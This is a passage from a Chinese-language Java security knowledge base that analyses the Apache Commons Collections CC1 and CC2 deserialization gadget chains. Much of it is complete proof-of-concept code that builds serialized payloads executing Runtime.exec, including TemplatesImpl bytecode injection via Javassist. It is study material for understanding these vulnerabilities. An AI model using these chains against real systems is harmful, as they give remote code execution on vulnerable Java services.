InvokerTransformer(\"getRuntime\",new Class[]{},new Object[]{}), //上面Runtime.getRuntime()得到了实例，作为这边的输入(invoke调用普通方法，需要传入类的实例) new InvokerTransformer(\"exec\", new Class[] {String.class }, new Object[] {\"calc.exe\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); transformerChain.transform(null); 看起来万事大吉了，但是 在对InvokerTransformer中Class cls = input.getClass(); 的解释中可以知道 当input是一个类的实例对象，获取到的是这个类 当input是一个类时，获取到的是java.lang.Class 我们来推演第一次InvokerTransformer的反射调用，即得到Runtime类对象的getRuntime方法调用 //InvokeTransformer关键语句： public Object transform(Object input) {//input为我们设置的常量Runtime.class Class cls = input.getClass();//这里由于input是一个类，会得到java.lang.Class //在java.lang.Class类中去寻找getRuntime方法企图得到Runtime类对象，此处报错 Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); } 那么我们好像陷入了一个死胡同： 得到Runtime类实例才能调用exec方法。 而得到Runtime类实例作为input，才能得到Runtime class，才能找到getRuntime方法，得到Runtime类实例......... 继续反思反射机制 那么我们通过直接调用Runtime.getRuntime方法好像是行不通了,有没有其他方法呢？ 目前问题有如下： 我们开头不能获得Class.forName(\"java.lang.Runtime\")，只能得到Class.forName(\"java.lang.Class\") 我们可以有任意的反射机制 我们要获取到Runtime.getRunime函数，并执行它。 通过反射机制获取反射机制中的getMethod类，由于getMethod类是存在Class类中，就符合开头Class类的限制 通过getMethod函数获取Runtime类中的getRuntime函数 在哪个类中调用getMethod去获取方法，实际上是由invoke函数里面的的第一个参数obj决定的 再通过反射机制获取反射机制中的invoke类，执行上面获取的getRuntime函数 invoke调用getRuntime函数，获取Runtime类的实例 这里在使用反射机制调用getRuntime静态类时，invoke里面第一个参数obj其实可以任意改为null，或者其他类，而不一定要是Runtime类 我们最终要目的要执行 Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\") 先来获取getRuntime类 //目标语句 Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\") //使用java.lang.Class开头 Class.forName(\"java.lang.Class\").getMethod(\"getMethod\", new Class[] {String.class, Class[].class }) .invoke(Class.forName(\"java.lang.Runtime\"),\"getRuntime\",new Class[0]); //invoke函数的第一个参数是Runtime类，我们需要在Runtime类中去执行getMethod，获取getRuntime参数 对照着InvokerTransformer类转变为transformers格式 Class cls = input.getClass();//cls = java.lang.Class Method method = cls.getMethod(this.iMethodName, this.iParamTypes); //getMethod方法 return method.invoke(input, this.iArgs); //在Runtime中找getRuntime方法，并返回这个方法 Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] {\"getRuntime\", new Class[0] }), //还需要填充 调用getRuntime得到Runtime实例, new InvokerTransformer(\"exec\", new Class[] {String.class }, new Object[] {\"calc.exe\"}) }; 还差执行获取到的getRuntime，下一个input是上一个执行接口，继续对照 //input=getRuntime这个方法 Class cls = input.getClass();//cls = java.lang.Method（getRuntime方法是method类） Method method = cls.getMethod(this.iMethodName, this.iParamTypes); //在method类中找到invoke方法，method=invoke方法 return method.invoke(input, this.iArgs); //调用invoke方法，input=getRuntime这个方法，传入自定义的参数 以上最后一步有点复杂，method就是invoke方法，相当于使用invoke调用了invoke函数。 首先this.iMethodName, this.iParamTypes是根据invoke接口而定的： public Object invoke(Object obj, Object... args) //this.iMethodName=\"invoke\" //this.iParamTypes=new Class[] {Object.class, Object[].class } //外面class、Object封装是InvokerTransformer类的构造函数要求 按照invoke中的input才是它要调用的环境的准则。 invoke方法.invoke(input, this.iArgs)实际上等于input.invoke(this.iArgs)， 而input=getRuntime方法，那么只要填入this.iArgs就好了 又由于getRuntime是个静态函数，不用太纠结输入obj，写作null。getRuntime方法不需要参数。 this.iArgs=null,new Object[0] 那么整合如下： Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] {\"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] {String.class }, new Object[] {\"calc.exe\"}) }; 也就是我们Commons Collections1的前置知识里讲的payload，到了这里才讲到为什么构造前置知识中的payload TransformedMap 那么我们在第二步通过ConstantTransformer、ChainedTransformer就完成了payload在客户端自定义这一目标，我们看一下目前的攻击流程 package com.myproject; import org.apache.commons.collections.*; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.util.HashMap; import java.util.Map; public class test { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]{String.class, Class[].class},new Object[]{\"getRuntime\",new Class[0]}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc.exe\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); FileOutputStream fileOutputStream = new FileOutputStream(\"payload.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(transformerChain); FileInputStream fileInputStream = new FileInputStream(\"payload.ser\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); Transformer transformer = (ChainedTransformer) objectInputStream.readObject(); transformer.transform(null); } } 完成命令执行服务端执行如下操作： 服务端反序列化我们的输入成ChainedTransformer类型 调用这个输入的transform()函数 转变的类型是一个数据转化链数据格式，很明显服务端不可能存在这种代码，利用价值不足，接下来我们需要继续延长这个漏洞链。 封装成Map 由于我们得到的是ChainedTransformer，一个转换链，TransformedMap类提供将map和转换链绑定的构造函数，只需要添加数据至map中就会自动调用这个转换链执行payload。 这样我们就可以把触发条件从显性的调用转换链的transform函数延伸到修改map的值。很明显后者是一个常规操作，极有可能被触发 TransformedMap public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) { return new TransformedMap(map, keyTransformer, valueTransformer); } package com.myproject; import org.apache.commons.collections.*; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.util.HashMap; import java.util.Map; public class test { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); //创建Map并绑定transformerChina Map innerMap = new HashMap(); innerMap.put(\"value\", \"value\"); //给予map数据转化链 Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //payload序列化写入文件，模拟网络传输 FileOutputStream fileOutputStream = new FileOutputStream(\"payload.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(outerMap); // 服务端反序列化客户端代码，触发漏洞 FileInputStream fileInputStream = new FileInputStream(\"payload.ser\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); //服务端反序列化成Map格式，再调用transform函数 Map outerMap_now = (Map) objectInputStream.readObject(); //2.1可以直接map添加新值，触发漏洞 outerMap_now.put(\"123\", \"123\"); //2.2也可以获取map键值对，修改value，value为value，foobar,触发漏洞 // Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next(); // onlyElement.setValue(\"foobar\"); } } jdk1.7 AnnotationInvocationHandler的readObject复写点 上面的漏洞触发条件仍然不够完美，需要服务端把我们传入的序列化内容反序列化为map，并对值进行修改。 之前也说过完美的反序列化漏洞还需要一个readobject复写点，只要服务端执行了readObject函数就等于命令执行。 在jdk1.7中就存在一个完美的readobject复写点的类sun.reflect.annotation.AnnotationInvocationHandler。 先看对应的构造函数 AnnotationInvocationHandler(Class var1, Map var2) { Class[] var3 = var1.getInterfaces(); if (var1.isAnnotation() && var3.length == 1 && var3[0] == Annotation.class) {//var1满足这个if条件时 this.type = var1;//传入的var1到this.type this.memberValues = var2;//我们的map传入this.memberValues } else { throw new AnnotationFormatError(\"Attempt to create proxy for a non-annotation type.\"); } } readobject复写函数 private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException { //默认反序列化 var1.defaultReadObject(); AnnotationType var2 = null; try { var2 = AnnotationType.getInstance(this.type); } catch (IllegalArgumentException var9) { throw new InvalidObjectException(\"Non-annotation type in annotation serial stream\"); } Map var3 = var2.memberTypes();// Iterator var4 = this.memberValues.entrySet().iterator();//获取我们构造map的迭代器 while(var4.hasNext()) { Entry var5 = (Entry)var4.next();//遍历map迭代器 String var6 = (String)var5.getKey();//获取key的名称 Class var7 = (Class)var3.get(var6);//获取var2中相应key的class类？这边具体var3是什么个含义不太懂，但是肯定var7、8两者不一样 if (var7 != null) { Object var8 = var5.getValue();//获取map的value if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) { //两者类型不一致，给var5赋值！！具体赋值什么已经不关键了！只要赋值了就代表执行命令成功 var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + \"[\" + var8 + \"]\")).setMember((Method)var2.members().get(var6))); } } } } } readObject最终对于我们传入构造函数的map进行遍历赋值。 这样就弥补了我们之前反序列化需要服务端存在一些条件的不足，形成完美反序列化攻击 最终模拟攻击代码 package com.myproject; import org.apache.commons.collections.*; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.util.HashMap; import java.util.Map; public class test { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); //创建Map并绑定transformerChina Map innerMap = new HashMap(); innerMap.put(\"value\", \"value\"); //给予map数据转化链 Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); Class cls = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = cls.getDeclaredConstructor(Class.class,Map.class); constructor.setAccessible(true); Object object = constructor.newInstance(Target.class,outerMap); //payload序列化写入文件，模拟网络传输 FileOutputStream fileOutputStream = new FileOutputStream(\"payload.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(object); // 服务端反序列化客户端代码，触发漏洞 FileInputStream fileInputStream = new FileInputStream(\"payload.ser\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); // 直接反序列化 objectInputStream.readObject(); } } 至此，我们在客户端构造了payload发送至服务端， 只要服务端 对我们的输入进行反序列化 jdk版本为1.7 就可以直接完成命令执行 问题 为什么innerMap.put(\"value\", \"value\");将key更改为其他值，就不能执行成功？(innerMap.put(\"key\", \"value\");这种格式) debug一下看看 在readObject中，var3是一个map结构，var6 会获取我们构造的map中的key值，然后通过key值取var3中的class，如果var6!=value，那么var7为空，不能进入if结构，导致不能进行setValue操作（也就是反序列化赋值操作），所以在这里需要将值固定为键值设置为value 参考链接 https://xz.aliyun.com/t/7031 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-22 20:57:53 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/19.CommonsCollections/01.CC1/02.CommonsCollections1分析利用.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/19.CommonsCollections/02.CC2/CommonsCollection2分析.html":{"url":"知识库/02.JAVA安全/19.CommonsCollections/02.CC2/CommonsCollection2分析.html","title":"CommonsCollection2分析","keywords":"","body":" 简介 环境 POC 提出问题 分析 解决方案 Javassist 介绍 ClassPool CtClass 示例代码 POC 0x1 0x2 0x3 0x4 0x5 分析 总结 参考链接 简介 CC2 使用的是 javassist和PriorityQueue来构造利用链，并且使用的是commons-collections-4.0版本，而3.1-3.2.1版本中TransformingComparator并没有去实现Serializable接口，也就是说这是不可以被序列化的，所以CC2不用3.x版本 环境 jdk1.8 commons collections4-4.0 POC 首先看poc package com.myproject; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.*; import java.lang.reflect.Field; import java.util.PriorityQueue; public class TestCC2 { public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, NoSuchFieldException { Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] { String.class}, new String[] {\"calc.exe\"}), }; Transformer transformerChain = new ChainedTransformer(transformers); TransformingComparator Tcomparator = new TransformingComparator(transformerChain); PriorityQueue queue = new PriorityQueue(1); queue.add(1); queue.add(2); Field field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); field.setAccessible(true); field.set(queue,Tcomparator); try{ ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"cc2.ser\")); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"cc2.ser\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } } ysoserial提供的利用链如下 /* Gadget chain: ObjectInputStream.readObject() PriorityQueue.readObject() ... TransformingComparator.compare() InvokerTransformer.transform() Method.invoke() Runtime.exec() */ 我们可以看到这段代码，和CC1中的payload是一样的，看过Commons Collection1 分析利用的朋友在这里不难理解为什么我们要这样构造 Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] { String.class}, new String[] {\"calc.exe\"}), }; 提出问题 然后看下面的代码，就会好奇了 Transformer transformerChain = new ChainedTransformer(transformers); TransformingComparator Tcomparator = new TransformingComparator(transformerChain); PriorityQueue queue = new PriorityQueue(1); queue.add(1); queue.add(2); Field field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); field.setAccessible(true); field.set(queue,Tcomparator); 我们在Commons Collection1 分析利用中可以知道，我们需要创建一个map，并绑定transformerchain，并在最后给予map数据转化链，然后再进行序列化，反序列化 最后再触发漏洞。在cc2链其实差不太多，我们需要给予一个数据转化链给comparator(比较器)，并绑定transformerchain，然后通过给queue(队列)赋值，最后序列化该实例queue，再反序列化，完成攻击。 并且在java.util.PriorityQueue构造函数中，存在构造函数是可以传入comparator的，为什么还要通过反射，给comparator赋值呢？ public PriorityQueue(int initialCapacity, Comparator comparator) { // Note: This restriction of at least one is not actually needed, // but continues for 1.5 compatibility if (initialCapacity 那么我们不使用反射，就利用构造函数来试一试呢？ package com.myproject; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.*; import java.lang.reflect.Field; import java.util.PriorityQueue; public class TestCC2 { public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, NoSuchFieldException { Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] { String.class}, new String[] {\"calc.exe\"}), }; Transformer transformerChain = new ChainedTransformer(transformers); TransformingComparator Tcomparator = new TransformingComparator(transformerChain); PriorityQueue queue = new PriorityQueue(1, Tcomparator); queue.add(1); queue.add(2); try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"cc2.ser\")); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"cc2.ser\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } } 在这里就有一个很隐藏的问题，看似执行了命令，但是却没有生成cc2.ser反序列化文件，说明没有进入try{}catch()，那么执行的命令就是客户端命令，而不会发送到服务端 在此处分析一下，为什么我们将Tcomparator通过构造函数写进去，生成的实例化对象queue，是不会进行进入try代码块序列化，就直接在客户端执行命令 分析 在queue.add处调试，在PriorityQueue这个构造函数中，这里就是我们传入的TransformingComparator 继续跟进，在queue.add(2)中，调用了offer方法 跟进offer方法，在这里需要关注siftUp方法 在siftUp方法中，comparator不为null(是我们传入的TransformingComparator)，则进入if循环，调用siftUpUsingComparator 方法 重点到comparator.compare()方法中，跟进 就到了compare方法中，在这里调用了两次this.transformer.transform方法 iTransformer从arr(构造的transformers[]数组)里取值，再调用transform方法 transform 方法就实现链式调用，执行transformers[]数组的Runtime.getRuntime.exec() 方法 像这样执行了两次，导致会弹出两次计算器，然后在此处执行完命令就抛出异常，程序就直接crash此时根本就还只是在向队列添加数据阶段，还没有进行序列化就直接crash，是根本就不行的 解决方案 我们在调用了siftUpUsingComparator方法，如果不走if分支，走else分支呢？也就是说不传入comparator，让其为null PriorityQueue queue = new PriorityQueue(1); queue.add(1); queue.add(2); 当其为null的时候，进入siftUpComparable方法，可以发现在这里只对队列进行了赋值操作，并没有进行compare操作。 返回后就执行序列化代码，但是并没有执行命令 那么如果需要在readObject中调用compare方法这个是否可能成功呢? 这里我们要知道，序列化是将对象转换成字符串的过程，反序列化是将字符串转换成对象的过程，那么在反序列化的过程中，读取了字符串，将其转换成对象之后是不是就需要赋值操作呢？那么在赋值操作的时候，我们不让comparator为null，那么就能进入到siftDownUsingComparator函数中 条件： 要执行try-catch代码块的内容 -> queue 只执行赋值操作，在进行赋值操作的时候，comparator为null 在readObject的时候，需要执行compare函数 -> 赋值操作完成之后，序列化时PriorityQueue的comparator不能为null，否则反序列化时comparator就会为空，就不能进入siftDownUsingComparator函数中 queue.add(1); queue.add(2); Field field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); field.setAccessible(true); field.set(queue,Tcomparator); 在反序列化的时候，在readObejct函数里，执行heapify函数 我们通过反射设置了comparator为Tcomparator，此时comparator不为null，此时进入siftDownUsingComparator函数 在执行compare函数后，就执行transformer.transform方法，进行链式调用执行 到这里就执行了Runtime.getRuntime.exec(\"calc.exe\") Javassist Javassit字节码编程 介绍 Javassist是一个开源的分析、编辑和创建Java字节码的类库，可以直接编辑和生成Java生成的字节码。 能够在运行时定义新的Java类，在JVM加载类文件时修改类的定义。 Javassist类库提供了两个层次的API，源代码层次和字节码层次。源代码层次的API能够以Java源代码的形式修改Java字节码。字节码层次的API能够直接编辑Java类文件。下面大概讲一下POC中会用到的类和方法： ClassPool ClassPool是CtClass对象的容器，它按需读取类文件来构造CtClass对象，并且保存CtClass对象以便以后使用，其中键名是类名称，值是表示该类的CtClass对象。常用方法： static ClassPool getDefault()：返回默认的ClassPool，一般通过该方法创建我们的ClassPool； ClassPath insertClassPath(ClassPath cp)：将一个ClassPath对象插入到类搜索路径的起始位置； ClassPath appendClassPath：将一个ClassPath对象加到类搜索路径的末尾位置； CtClass makeClass：根据类名创建新的CtClass对象； CtClass get(java.lang.String classname)：从源中读取类文件，并返回对CtClass 表示该类文件的对象的引用； CtClass CtClass类表示一个class文件，每个CtClass对象都必须从ClassPool中获取 常用方法： void setSuperclass(CtClass clazz)：更改超类，除非此对象表示接口； byte[] toBytecode()：将该类转换为类文件； CtConstructor makeClassInitializer()：制作一个空的类初始化程序（静态构造函数）；示例代码 ```java package com.myproject; import javassist.*; public class TestJavassist { public static void createPerson() throws Exception{ //实例化一个ClassPool容器 ClassPool pool = ClassPool.getDefault(); //新建一个CtClass，类名为Cat CtClass cc = pool.makeClass(\"Cat\"); //设置一个要执行的命令 String cmd = \"System.out.println(\\\"javassit_test succes!\\\");\"; //制作一个空的类初始化，并在前面插入要执行的命令语句 cc.makeClassInitializer().insertBefore(cmd); //重新设置一下类名 String randomClassName = \"EvilCat\" + System.nanoTime(); cc.setName(randomClassName); //将生成的类文件保存下来 cc.writeFile(); //加载该类 Class c = cc.toClass(); //创建对象 c.newInstance(); } public static void main(String[] args) throws Exception { createPerson(); } } 新生成的类是这样子的，其中有一块static代码； ![image.png](./Commons Collection2 分析.assets/2023_05_19_10_37_19_Z49RiqS1.png) 当该类被实例化的时候，就会执行static里面的语句； 在ysoserial的cc2中引入了 TemplatesImpl 类来进行承载攻击payload，需要用到javassist； ### POC ```java package com.myproject; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.*; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.PriorityQueue; public class TestJavassist { public static void main(String[] args) throws Exception { Constructor constructor = Class.forName(\"org.apache.commons.collections4.functors.InvokerTransformer\").getDeclaredConstructor(String.class); constructor.setAccessible(true); InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(\"newTransformer\"); TransformingComparator Tcomparator = new TransformingComparator(transformer); PriorityQueue queue = new PriorityQueue(1); ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"Cat\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\"; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \"EvilCat\" + System.nanoTime(); cc.setName(randomClassName); // cc.writeFile(); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \"_bytecodes\", targetByteCodes); setFieldValue(templates, \"_name\", \"1\"); setFieldValue(templates, \"_class\", null); Object[] queue_array = new Object[]{templates,1}; Field queue_field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"queue\"); queue_field.setAccessible(true); queue_field.set(queue,queue_array); Field size = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"size\"); size.setAccessible(true); size.set(queue,2); Field comparator_field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); comparator_field.setAccessible(true); comparator_field.set(queue,Tcomparator); try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc2.bin\")); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc2.bin\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } } 由于这个链于第一个payload 不同，在这里我讲解每一段代码的用法 0x1 通过反射实例化InvokerTransformer对象，设置InvokerTransformer的methodName为newTransformer；这里做的目的是为了调用后面我们设置的**TemplatesImpl**的**newTransformer**方法，而这个**Tcomparator**就如第一个poc一样，将进入**comparator.compare()**方法，进行**transform**方法，进而执行**method.invoke(input,this.args)**，为后续做铺垫 Constructor constructor = Class.forName(\"org.apache.commons.collections4.functors.InvokerTransformer\").getDeclaredConstructor(String.class); constructor.setAccessible(true); InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(\"newTransformer\"); TransformingComparator Tcomparator = new TransformingComparator(transformer); PriorityQueue queue = new PriorityQueue(1); 0x2 这里需要使用javassit对应的代码，为什么要继承AbstractTranslet类？这里为什么要将类转换成byte数据，并且还一定要放置在byte[][]中？ //实例化一个ClassPool容器 ClassPool pool = ClassPool.getDefault(); //向pool容器类搜索路径的起始位置插入AbstractTranslet.class pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); //新建一个CtClass，类名为Cat CtClass cc = pool.makeClass(\"Cat\"); //设置一个要执行的命令 String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\"; //制作一个空的类初始化，并在前面插入要执行的命令语句 cc.makeClassInitializer().insertBefore(cmd); //重新设置一下类名，生成的类的名称就不再是Cat String randomClassName = \"EvilCat\" + System.nanoTime(); cc.setName(randomClassName); // cc.writeFile(); //继承AbstractTranslet类 **重点** cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); //将该类转换为字节数组 byte[] classBytes = cc.toBytecode(); //将一维数组classBytes放到二维数组targetByteCodes的第一个元素 byte[][] targetByteCodes = new byte[][]{classBytes}; 在这里因为我们使用的TemplatesImpl，在其对应的_bytecodes参数中，是需要一个二维byte数组，并且在后续需要实例化_bytecodes的时候会检查是否继承了AbstractTranslet类 0x3 在这里通过给实例化的templates中的_bytecodes，_name，_class赋值操作，由于这些参数都是private，只能通过反射赋值，且_bytecodes为javassit动态生成的恶意类，_name可以为任意值，但是不能为空，_class一定为null，为什么要这样，在调试的时候再做解释 TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \"_bytecodes\", targetByteCodes); setFieldValue(templates, \"_name\", \"1\"); setFieldValue(templates, \"_class\", null); public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } 0x4 第一部分相当于是给queue赋值，相当于执行add操作，第二部分是给queue设置为2，第三部分就是在poc中强调的部分，最后通过反射将comparator绑定到实例化的queue中 Object[] queue_array = new Object[]{templates,1}; Field queue_field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"queue\"); queue_field.setAccessible(true); queue_field.set(queue,queue_array); Field size = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"size\"); size.setAccessible(true); size.set(queue,2); Field comparator_field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); comparator_field.setAccessible(true); comparator_field.set(queue,Tcomparator); 0x5 模拟网络传输，执行序列化与反序列化 try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc2.bin\")); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc2.bin\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } 分析 在inputStream.readObject()处打断点，跟进直到comparator.compare()方法中进入comparator.compare() 方法中在这里可以看到这里会去执行TemplatesImpl.newTransformer()方法方法 在这里可以看到0x3中说_name可以为任意值，但不能为null，以及_class要为null，因为只有当_class为null，才能执行defineTransletClasses()函数![图片.png](https://cdn.nlark.com/yuque/0/2022/png/21929389/1652081732138-12a14b9e-31de-4ec7-b656-8bcbcd949e9c.png#clientId=u2044ba9c-3055-4&from=paste&height=1040&id=u47cea69b&originHeight=1040&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=201107&status=done&style=none&taskId=u1f601e89-5433-458c-9e53-3cbd9e1a86d&title=&width=1920)进入defineTransletClasses函数，可以看到这个注释，大概意思就是会返回对自定义的类![图片.png](./Commons Collection2 分析.assets/2023_05_19_10_37_20_sKSidtZV.png)loader.defineClass(_bytecodes[i]);将字节数组还原为Class对象 ,_class[0]就是恶意类 